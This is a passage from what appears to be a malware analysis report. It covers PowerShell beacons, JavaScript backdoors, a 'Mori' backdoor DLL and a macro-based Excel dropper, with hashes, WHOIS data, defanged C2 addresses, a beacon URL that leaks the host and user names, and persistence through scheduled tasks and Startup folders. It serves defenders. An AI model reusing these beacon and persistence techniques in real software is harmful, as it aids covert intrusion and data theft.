RIPE\n\n\t\t\tperson: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Host Sailor Ltd - Administrative role account\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Suite No: 1605, Churchill Executive Tower, Burj Khalifa Area\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Dubai P.O. Box 98362\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0United Arab Emirates\n\t\t\tphone: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 +97145577845\n\t\t\tnic-hdl: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AF11712-RIPE\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MNT-HS\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02014-06-30T16:22:26Z\n\t\t\tlast-modified: 2019-05-29T09:39:31Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 RIPE\nRelationships\n\n\n\n185.117.75.34\nConnected_From\ne7f6c7b91c482c12fc905b84dbaa9001ef78dc6a771773e1de4b8eade5431eca\n\n\n185.117.75.34\nConnected_From\nb6133e04a0a1deb8faf944dd79c46c62f725a72ea9f26dd911d6f6e1e4433f1a\n\n\n\nDescription\nconfig.txt (b6133e04a0a1deb8faf944dd79c46c62f725a72ea9f26dd911d6f6e1e4433f1a) and HeidieLeone.txt (e7f6c7b91c482c12fc905b84dbaa9001ef78dc6a771773e1de4b8eade5431eca) attempt to connect to this IP address.\n\n\n9cb79736302999a7ec4151a43e93cd51c97ede879194cece5e46b4ff471a7af7\nTags\ntrojan\nDetails\n\n\n\nName\nConfig.txt\n\n\nSize\n5037 bytes\n\n\nType\nASCII text, with very long lines, with no line terminators\n\n\nMD5\na0421312705e847a1c8073001fd8499c\n\n\nSHA1\n3204447f54adeffb339ed3e00649ae428544eca3\n\n\nSHA256\n9cb79736302999a7ec4151a43e93cd51c97ede879194cece5e46b4ff471a7af7\n\n\nSHA512\n32c89ce4ec39c0f05fdd578ac7dbd51a882fdca632a00a591655992f258fe1b870c5ac6732d79c835578fd85c237d69d10886b1bec087217b921b8dbd2d7ab50\n\n\nssdeep\n96:ND25Bb2G+6C3z+FPyY1PgWuRuSpqq8HRYwC+w7ivocD6ZpY59lmBZ1q0c3:NKnCGO3iFPysIW8YlHRYw5w6F6ZpYUB0\n\n\nEntropy\n5.941005\n\n\n\nAntivirus\n\n\n\nESET\nPowerShell/Agent.FP trojan\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file was identified as an encrypted PowerShell script; it contains a beacon to the following hardcoded IP address:\n\n\t\t\t--Begin C2 IP address--\n\t\t\t192[.]210[.]191[.]188\n\t\t\t--End C2 IP address--\n\n\t\t\tThis file has similar capabilities as config.txt (ce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9).\n\n\n192.210.191.188\nTags\ncommand-and-control\nPorts\n\n443 TCP\n\nWhois\nQueried whois.arin.net with \"n ! NET-192-210-191-0-1\"...\n\n\t\t\tNetRange: \u00a0\u00a0\u00a0 192.210.191.0 - 192.210.191.255\n\t\t\tCIDR: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 192.210.191.0/24\n\t\t\tNetName: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0CC-192-210-191-0-24\n\t\t\tNetHandle: \u00a0\u00a0\u00a0 NET-192-210-191-0-1\n\t\t\tParent: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 CC-11 (NET-192-210-128-0-1)\n\t\t\tNetType: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Reallocated\n\t\t\tOriginAS: \u00a0\u00a0\u00a0 AS36352\n\t\t\tOrganization: Virtual Machine Solutions LLC (VMSL-100)\n\t\t\tRegDate: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02019-03-26\n\t\t\tUpdated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02019-03-26\n\t\t\tRef: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0https://rdap.arin.net/registry/ip/192.210.191.0\n\n\n\t\t\tOrgName: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Virtual Machine Solutions LLC\n\t\t\tOrgId: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 VMSL-100\n\t\t\tAddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a012201 Tukwila International Blvd\n\t\t\tCity: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Seattle\n\t\t\tStateProv: \u00a0\u00a0\u00a0 WA\n\t\t\tPostalCode: \u00a0\u00a0\u00a0 98168\n\t\t\tCountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0US\n\t\t\tRegDate: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02016-06-22\n\t\t\tUpdated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02020-12-10\n\t\t\tComment: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0http://virmach.com/abuse to report abuse.\n\t\t\tRef: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0https://rdap.arin.net/registry/entity/VMSL-100\n\n\n\t\t\tOrgTechHandle: GOLES88-ARIN\n\t\t\tOrgTechName: Golestani, Amir\n\t\t\tOrgTechPhone: +1-800-877-2176\n\t\t\tOrgTechEmail: report@virmach.com\n\t\t\tOrgTechRef: \u00a0\u00a0\u00a0https://rdap.arin.net/registry/entity/GOLES88-ARIN\n\n\t\t\tOrgAbuseHandle: GOLES88-ARIN\n\t\t\tOrgAbuseName: Golestani, Amir\n\t\t\tOrgAbusePhone: +1-800-877-2176\n\t\t\tOrgAbuseEmail: report@virmach.com\n\t\t\tOrgAbuseRef: \u00a0\u00a0\u00a0https://rdap.arin.net/registry/entity/GOLES88-ARIN\nRelationships\n\n\n\n192.210.191.188\nConnected_From\n5bcdd422089ed96d6711fa251544e2e863b113973db328590cfe0457bfeb564f\n\n\n\nDescription\nConfig.txt (9cb79736302999a7ec4151a43e93cd51c97ede879194cece5e46b4ff471a7af7) and Config2.txt (5bcdd422089ed96d6711fa251544e2e863b113973db328590cfe0457bfeb564f) attempt to connect to this IP address.\n\n\n5bcdd422089ed96d6711fa251544e2e863b113973db328590cfe0457bfeb564f\nTags\ntrojan\nDetails\n\n\n\nName\nConfig2.txt\n\n\nSize\n5037 bytes\n\n\nType\nASCII text, with very long lines, with no line terminators\n\n\nMD5\na16f4f0c00ca43d5b20f7bc30a3f3559\n\n\nSHA1\n94e26fb2738e49bb70b445315c0d63a5d364c71b\n\n\nSHA256\n5bcdd422089ed96d6711fa251544e2e863b113973db328590cfe0457bfeb564f\n\n\nSHA512\ne1f929029e7382e0a900fb3523dbc175d503b1903b034d88aed3e50aed768ce79c52091520e4a3e40c04e00ab70af3d438de35c79502ff8b11adcb45f6f666bd\n\n\nssdeep\n96:ND25Bb2FNushsy1XSWSAIm0Rs1yjLzJ8f3zT+ujYa42g2QR4HElM+ejX+2jIQSgp:NKnCFvsLcIm0bfzAd4F6HEl92pSgoFu\n\n\nEntropy\n5.935676\n\n\n\nAntivirus\n\n\n\nESET\nPowerShell/Agent.FP trojan\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n5bcdd42208...\nConnected_To\n192.210.191.188\n\n\n\nDescription\nThis file was identified as an encrypted PowerShell script; it contains a beacon to the following hardcoded IP address:\n\n\t\t\t--Begin C2 IP address--\n\t\t\t192[.]210[.]191[.]188\n\t\t\t--End C2 IP address--\n\n\t\t\tThis file has similar capabilities as config.txt (ce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9).\n\n\n9ec8319e278d1b3fa1ccf87b5ce7dd6802dac76881e4e4e16e240c5a98f107e2\nDetails\n\n\n\nName\nAntheHannah_config.txt\n\n\nSize\n3491 bytes\n\n\nType\ndata\n\n\nMD5\n51bc53a388fce06487743eadc64c4356\n\n\nSHA1\nb9e6fc51fa3940fb632a68907b8513634d76e5a0\n\n\nSHA256\n9ec8319e278d1b3fa1ccf87b5ce7dd6802dac76881e4e4e16e240c5a98f107e2\n\n\nSHA512\n43d291535b7521a061a24dc0fb1c573d1d011f7afa28e8037dea69eb5ae5bcd69b53a01a636e91827831066f9afc84efc1d556f64dc5cd780f9da79d38783b70\n\n\nssdeep\n48:oJX/VlShMEtkDJrSYChZh60cIpoEzMPkQwpCUOfcUeHe0eGeBr8ONIPoUy3pIhwx:uStoJCXhbcIvgPkQw8rfcR+xjBrRUsT\n\n\nEntropy\n5.319055\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file was identified as an encrypted PowerShell script; it contains a beacon.\n\n\t\t\tThis file has similar capabilities as config.txt (ce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9).\n\n\n255e53af8b079c8319ce52583293723551da9affe547da45e2c1d4257cff625a\nDetails\n\n\n\nName\nTeresitaJordain_config.txt\n\n\nSize\n3580 bytes\n\n\nType\ndata\n\n\nMD5\n0ac499496fb48de0727bbef858dadbee\n\n\nSHA1\n483cd5c9dd887367793261730d59178c19fe13f3\n\n\nSHA256\n255e53af8b079c8319ce52583293723551da9affe547da45e2c1d4257cff625a\n\n\nSHA512\nbe0d181aabd07b122fcdb79a42ba43ed879a5f0528745447f2c93c6d9cb75c00f1d581520c640fd7f4a61a6f27ef82d99ad09ee2f1cc85340252a7eb7a9fa7a1\n\n\nssdeep\n48:oHyk/BbLGAQUJaqQNMWyT1veKRzKykrSaowAQncpQNiqyC2V+mqoS3NwPK+2/t+Q:dyF1p7cKRzDbRBCUDP9X5NbfZJRQURC7\n\n\nEntropy\n5.296734\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n255e53af8b...\nConnected_To\n185.183.96.44\n\n\n\nDescription\nThis file was identified as an encrypted PowerShell script; it contains a beacon to the following hardcoded IP address:\n\n\t\t\t--Begin C2 IP address--\n\t\t\t185[.]183[.]96[.]44\n\t\t\t--End C2 IP address--\n\n\t\t\tThis file has similar capabilities as config.txt (ce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9).\n\n\n185.183.96.44\nTags\ncommand-and-control\nPorts\n\n443 TCP\n\nWhois\nQueried whois.ripe.net with \"-B 185.183.96.44\"...\n\n\t\t\t% Information related to '185.183.96.0 - 185.183.96.255'\n\n\t\t\t% Abuse contact for '185.183.96.0 - 185.183.96.255' is 'abuse@hostsailor.com'\n\n\t\t\tinetnum: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0185.183.96.0 - 185.183.96.255\n\t\t\tnetname: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0EU-HOSTSAILOR\n\t\t\tdescr: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 HostSailor NL Services\n\t\t\tcountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0NL\n\t\t\tadmin-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AA31720-RIPE\n\t\t\ttech-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 AA31720-RIPE\n\t\t\tstatus: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ASSIGNED PA\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MNT-HS\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02016-12-23T09:52:06Z\n\t\t\tlast-modified: 2016-12-23T09:52:06Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 RIPE\n\n\t\t\tperson: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Ali Al-Attiyah\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Suite No: 1605, Churchill Executive Tower, Burf Khalifa Area\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Dubai P.O. Box 98362\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0United Arab Emirates\n\t\t\tphone: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 +971 455 77 845\n\t\t\tnic-hdl: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AA31720-RIPE\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MNT-HS\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02016-12-21T19:19:26Z\n\t\t\tlast-modified: 2019-03-18T14:07:12Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 RIPE\n\n\t\t\t% Information related to '185.183.96.0/24AS60117'\n\n\t\t\troute: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 185.183.96.0/24\n\t\t\tdescr: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 EU-HOSTSAILOR 185.183.96.0/24\n\t\t\torigin: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 AS60117\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MNT-HS\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02016-12-23T09:50:04Z\n\t\t\tlast-modified: 2016-12-23T09:50:04Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 RIPE\nRelationships\n\n\n\n185.183.96.44\nConnected_From\n255e53af8b079c8319ce52583293723551da9affe547da45e2c1d4257cff625a\n\n\n\nDescription\nTeresitaJordain_config.txt (255e53af8b079c8319ce52583293723551da9affe547da45e2c1d4257cff625a) attempts to connect to this IP address.\n\n\ne7f6c7b91c482c12fc905b84dbaa9001ef78dc6a771773e1de4b8eade5431eca\nDetails\n\n\n\nName\nHeidieLeone.txt\n\n\nSize\n706 bytes\n\n\nType\nASCII text, with very long lines, with no line terminators\n\n\nMD5\nd68f5417f1d4fc022067bf0313a3867d\n\n\nSHA1\n2f6dd6d11e28bf8b4d7ceec8753d15c7568fb22e\n\n\nSHA256\ne7f6c7b91c482c12fc905b84dbaa9001ef78dc6a771773e1de4b8eade5431eca\n\n\nSHA512\n39023583902e616a196357a69ab31371842f3b6119914803b19e62388dc873ab02567ac398148f84c68adac6228a8cb4e83afb0be24bdf1603a618669030bf39\n\n\nssdeep\n12:B6V3vKH/RRNyzV3vowKzV3voDPMV3v7SzV3vHzvm5V3vWQ52LgxxOWpgVEQgjVoL:sV3E/ozV3pKzV3GPMV3OzV3j4V3OQ4sI\n\n\nEntropy\n5.145602\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\ne7f6c7b91c...\nConnected_To\n185.117.75.34\n\n\n\nDescription\nThis file was identified as an encrypted PowerShell script; it contains a beacon to the following hardcoded IP address:\n\n\t\t\t--Begin C2 IP address--\n\t\t\t185[.]117[.]75[.]34\n\t\t\t--End C2 IP address--\n\n\t\t\tThis file has similar capabilities as config.txt (ce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9).\n\n\nb1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c\nTags\ntrojan\nDetails\n\n\n\nName\nnote.js\n\n\nSize\n3235 bytes\n\n\nType\nASCII text, with very long lines, with CRLF line terminators\n\n\nMD5\nc0c2cd5cc018e575816c08b36969c4a6\n\n\nSHA1\n47a4e0d466bb20cec5d354e56a9aa3f07cec816a\n\n\nSHA256\nb1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c\n\n\nSHA512\n4b930da1435a72095badaeca729baca8d6af9ab57607e01bd3dd1216eee75c8f8b7981a92640d475d908c6f22811900133aed8ab8513c38f5bc82b60752bf929\n\n\nssdeep\n96:/r9/hIgY/5N8s2Q5bQRWs4uQ5WQRWumVxE1Fq:T9/hILLdpG4Rdmwq\n\n\nEntropy\n5.200319\n\n\n\nAntivirus\n\n\n\nNANOAV\nTrojan.Script.Heuristic-js.iacgm\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nb1e30cce6d...\nConnected_To\n185.118.164.21\n\n\n\nDescription\nThis file is a JavaScript file that contains a PowerShell beacon for a GET request to:\n\n\t\t\t--Begin GET request--\n\t\t\t185[.]118[.]164[.]21:80/index?param=<computer_name>/<username>\n\t\t\t--End GET request--\n\n\t\t\tThe JavaScript is launched using the native file \u201cWScript.exe\u201d where the file also creates persistence by copying itself to the user\u2019s Contacts folder and creating a Scheduled Task to relaunch the PowerShell script daily at 10:01. The manifestation function shows the parameters used to build the GET request to 185[.]118[.]164[.]21 and the scheduled task (Figure 7 and Figure 8).\n\n\t\t\tAs a persistence mechanism, the manifestation function also copies the file to the User\u2019s Contacts folder, and sets a Scheduled Task to recur daily at 10:01 AM, which would relaunch the PowerShell beacon to 185[.]118[.]164[.]213 (Figure 9).\nScreenshots\n \n\nFigure 7 - Screenshot of the main code for the JavaScript.\n\n \n\nFigure 8a - Screenshot of the network beacon.\n\n \n\nFigure 8b - Screenshot of the network beacon.\n\n \n\nFigure 9 - Screenshot of the malware creating a task.\n\n \n\nFigure 10a - Screenshot of the command being executed.\n\n \n\nFigure 10b - Screenshot of the command being executed.\n\n\n\n185.118.164.21\nTags\ncommand-and-control\nURLs\n\n185.118.164.21/index?param=<computer_name>/<username>\n\nPorts\n\n80 TCP\n\nWhois\nQueried whois.ripe.net with \"-B 185.118.164.21\"...\n\n\t\t\t% Information related to '185.118.164.0 - 185.118.165.255'\n\n\t\t\t% Abuse contact for '185.118.164.0 - 185.118.165.255' is 'abuse@profitserver.ru'\n\n\t\t\tinetnum: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0185.118.164.0 - 185.118.165.255\n\t\t\tnetname: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0RU-CHELYABINSK-SIGNAL-20150923\n\t\t\tcountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0RU\n\t\t\tadmin-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AN29881-RIPE\n\t\t\ttech-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 AN29881-RIPE\n\t\t\tstatus: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ASSIGNED PA\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ru-chelyabinsk-signal-1-mnt\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02016-10-12T10:22:21Z\n\t\t\tlast-modified: 2016-10-12T10:22:21Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 RIPE\n\n\t\t\tperson: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Alexey Nevolin\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Ordzhonikidze str., 54-B\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0454091\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Chelyabinsk\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0RUSSIAN FEDERATION\n\t\t\tphone: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 +7 3517299971\n\t\t\tnic-hdl: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AN29881-RIPE\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ru-chelyabinsk-signal-1-mnt\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02015-09-18T15:23:57Z\n\t\t\tlast-modified: 2015-09-18T15:23:58Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 RIPE\n\n\t\t\t% Information related to '185.118.164.0/24AS44493'\n\n\t\t\troute: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 185.118.164.0/24\n\t\t\tdescr: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Chelyabinsk-Signal\n\t\t\torigin: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 AS44493\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ru-chelyabinsk-signal-1-mnt\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02015-11-17T05:53:42Z\n\t\t\tlast-modified: 2015-11-17T05:53:42Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 RIPE\nRelationships\n\n\n\n185.118.164.21\nConnected_From\nb1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c\n\n\n185.118.164.21\nConnected_From\n42ca7d3fcd6d220cd380f34f9aa728b3bb68908b49f04d04f685631ee1f78986\n\n\n\nDescription\nnote.js (b1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c) and rj.js (42ca7d3fcd6d220cd380f34f9aa728b3bb68908b49f04d04f685631ee1f78986) connected to this IP address.\n\n\n42ca7d3fcd6d220cd380f34f9aa728b3bb68908b49f04d04f685631ee1f78986\nTags\nbackdoor\nDetails\n\n\n\nName\nrj.js\n\n\nSize\n5257 bytes\n\n\nType\nASCII text, with very long lines\n\n\nMD5\n37fa9e6b9be7242984a39a024cade2d5\n\n\nSHA1\n0211569091b96cffab6918e18ccc97f4b24d88d4\n\n\nSHA256\n42ca7d3fcd6d220cd380f34f9aa728b3bb68908b49f04d04f685631ee1f78986\n\n\nSHA512\n889f293af25aa3af14c580000f15ade58e5b6b6000f42ddf38b69fd74a663b4c92cc2a90bfc9804d9de194e1eeee734f0b9e0ea5838afbc09f6fa3bfb3f5891c\n\n\nssdeep\n96:ub0werybmdzpcY3EUCGYZoTuEDdEyh8G2ng7qci1yMA1h5+N:ub09ymdzpcY3BOZIDmyh8G2ntci1P856\n\n\nEntropy\n5.422642\n\n\n\nAntivirus\n\n\n\nEmsisoft\nJS.Heur.Backdoor.2.BA440290.Gen (B)\n\n\nLavasoft\nJS.Heur.Backdoor.2.BA440290.Gen\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n42ca7d3fcd...\nConnected_To\n185.118.164.21\n\n\n\nDescription\nThis file is a heavily obfuscated JavaScript with encoded values which contains a PowerShell beacon for a GET request to:\n\n\t\t\t--Begin GET request--\n\t\t\t185[.]118[.]164[.]21:80/index?param=<computer_name>/<username>\n\t\t\t--End GET Request--\n\n\t\t\tThis file performs the same tasks as \"note.js\" (b1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c) and is launched using the native file \u201cWScript.exe\u201d where the rj.js gains persistence by copying itself to the user\u2019s Contacts folder and creating a Scheduled Task to relaunch the PowerShell script daily at 10:01 AM.\n\n\n3098dd53da40947a82e59265a47059e69b2925bc49c679e6555d102d1c6cbbc8\nTags\nbackdoor\nDetails\n\n\n\nName\nFML.dll\n\n\nSize\n210397496 bytes\n\n\nType\nPE32+ executable (DLL) (GUI) x86-64, for MS Windows\n\n\nMD5\n0431445d6d6e5802c207c8bc6a6402ea\n\n\nSHA1\n3765c1ad8a1d936aad88255aef5d6d4ce24f94e8\n\n\nSHA256\n3098dd53da40947a82e59265a47059e69b2925bc49c679e6555d102d1c6cbbc8\n\n\nSHA512\nf46d71a66aa615efdcec37ff282201695f6216a8903a83edee874ced321b8a090baf1054e77bd3ed642e5da60522ea245e1741726fc4b49ccbef11203f5790bf\n\n\nssdeep\n3145728:LFiQ9FiQ9FiQ9FiQ9FiQ9FiQ9FiQ9FiQ9FiQ9FiQ9FiQ9FiQ9FiY:AQyQyQyQyQyQyQyQyQyQyQyQyY\n\n\nEntropy\n7.999913\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2020-01-20 09:19:24-05:00\n\n\nImport Hash\n3bcc46e3f517ddf9666020895796153f\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\nfea26576aaf64f90e067892d07fb8f97\nheader\n1024\n3.335479\n\n\n11cc597cf11ee87c3a0f76dcecf7556a\n.text\n468992\n6.420810\n\n\n52f5c458bae1ec48fc650d0975663910\n.rdata\n167936\n4.843554\n\n\nf7a88a7f326a63079052f1884b57e3a8\n.data\n11264\n4.040157\n\n\nc2b5de9421b4a0c9b7d4688f4ae051ac\n.pdata\n25088\n5.777552\n\n\n1f354d76203061bfdd5a53dae48d5435\n.tls\n512\n0.020393\n\n\n37b679e67208f1af8eed89301450017a\n.rsrc\n209716224\n8.000000\n\n\nef43c49686a0f7100f95a3dfa50d84ea\n.reloc\n5120\n5.322063\n\n\n\nDescription\nThis file has been identified as a Mori Backdoor. The file is a DLL written in C++ that is executed with regsvr32.exe with export DllRegisterServer and appears to be a component to another program. FML.dll contains approximately 200MB of junk in a resource directory 205, number 105. Upon execution, FML.dll creates a mutex: 0x50504060 and performs the following tasks:\n\n\t\t\t- Deleting the file FILENAME.old and deleting file by registry value. The filename is the DLL file with a .old extension (Figure 13).\n\t\t\t- The sample resolves networking APIs from strings that are ADD-encrypted with the key 0x05.\n\t\t\t- The sample uses Base64 and JSON based on certain key values passed to the JSON library functions. It appears likely that JSON is used to serialize C2 commands and/or their results.\n\t\t\t- For C2 communication, the sample uses HTTP over either IPv4 or IPv6, depending on the value of an unidentified flag.\n\t\t\t- Reading and/or writing data from the following Registry Keys, HKLM\\Software\\NFC\\IPA and HKLM\\Software\\NFC\\(Default)\n\t\t\t(See Figure 14).\nScreenshots\n \n\nFigure 11 - Screenshot of the mutex.\n\n \n\nFigure 12 - Screenshot of the exports.\n\n \n\nFigure 13 - Screenshot of the malware deleting the file FILENAME.old and deleting the file by registry value.\n\n \n\nFigure 14 - Screenshot of the deleted Registry Keys.\n\n\n\n026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141\nTags\ndownloaderdropperloadertrojan\nDetails\n\n\n\nName\nCooperation terms.xls\n\n\nSize\n252928 bytes\n\n\nType\nComposite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: pc, Last Saved By: interstellar, Name of Creating Application: Microsoft Excel, Create Time/Date: Wed Sep 29 20:38:56 2021, Last Saved Time/Date: Mon Oct 4 07:32:17 2021, Security: 0\n\n\nMD5\nb0ab12a5a4c232c902cdeba421872c37\n\n\nSHA1\na8e7659942cc19f422678181ee23297efa55fa09\n\n\nSHA256\n026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141\n\n\nSHA512\nc1ff4c3bd44e66e45cdb66b818a963d641cde6b9ea33ac64374929f182cd09e944d9337a588ba99d3df98190ba979431d015d848aa09c2d93763a1ed795ff304\n\n\nssdeep\n6144:Lk3hOdsylKlgryzc4bNhZF+E+W2knAcYi4uU4pVZ8lx+tSeJBWC:5iLZpVZ8lx+tn3WC\n\n\nEntropy\n7.167960\n\n\n\nAntivirus\n\n\n\nAntiy\nTrojan[Downloader]/MSOffice.Agent.pmk\n\n\nBitdefender\nTrojan.Generic.30623170\n\n\nESET\nVBS/Agent.PMK trojan\n\n\nEmsisoft\nTrojan.Generic.30623170 (B)\n\n\nIKARUS\nTrojan.VBS.Agent\n\n\nLavasoft\nTrojan.Generic.30623170\n\n\nMcAfee\nRDN/Sagent\n\n\nNANOAV\nTrojan.Ole2.Vbs-heuristic.druvzi\n\n\nQuick Heal\nX97M.Trojan.Agent.45255\n\n\nSophos\nTroj/DocDl-AEVH\n\n\nSymantec\nTrojan.Mdropper\n\n\nTrend Micro\nPossibl.564B8E70\n\n\nTrend Micro HouseCall\nPossibl.564B8E70\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n026868713d...\nDropped\nc2badcdfa9b7ece00f245990bb85fb6645c05b155b77deaf2bb7a2a0aacbe49e\n\n\n026868713d...\nDropped\nf10471e15c6b971092377c524a0622edf4525acee42f4b61e732f342ea7c0df0\n\n\n\nDescription\nThis artifact is a malicious Excel file that contains macros written in Visual Basic for Applications (VBA) and two encoded wsf files. When the Excel file is opened, the victim will be prompted to enable macros with the \u201cEnable Content\u201d button. The macros are executed once the victim enables content. When executed, the macros decode and install the embedded wsf files into the directories below:\n\n\t\t\t--Begin files--\n\t\t\t\"%AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Outlook.wsf\"\n\t\t\t\"C:\\ProgramData\\Outlook.wsf \"\n\t\t\t--End files--\nScreenshots\n \n\nFigure 15 - The contents of the Excel file.\n\n \n\nFigure 16 - The contents of the macros used to decode and install the embedded wsf files on the compromised system.\n\n\n\nc2badcdfa9b7ece00f245990bb85fb6645c05b155b77deaf2bb7a2a0aacbe49e\nTags\ndownloaderloadertrojan\nDetails\n\n\n\nName\nOutlook.wsf\n\n\nSize\n11692 bytes\n\n\nType\nHTML document, Little-endian UTF-16 Unicode text, with CRLF line 